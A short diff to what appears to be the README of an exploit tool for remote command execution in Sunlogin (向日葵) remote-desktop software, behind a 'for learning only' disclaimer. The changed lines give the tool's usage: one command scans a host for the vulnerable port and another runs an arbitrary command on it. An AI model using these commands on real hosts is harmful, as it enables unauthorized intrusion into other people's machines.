@@ -7,5 +7,5 @@ It is only for learning and communication, and cannot be reproduced without the 
 Any direct or indirect consequences and losses caused by the dissemination and use of this tool are the responsibility of the user, and the author does not assume any responsibility for this.
 
 向日葵 命令注入（rce）利用
-sunlogin_rce.exe  -H ip  扫描存在rce端口
-sunlogin_rce.exe  -H ip -P rce端口 -C  执行命令
+sunlogin_rce.exe -H ip 扫描存在的端口
+sunlogin_rce.exe -H ip -P rce 端口 -C 执行命令
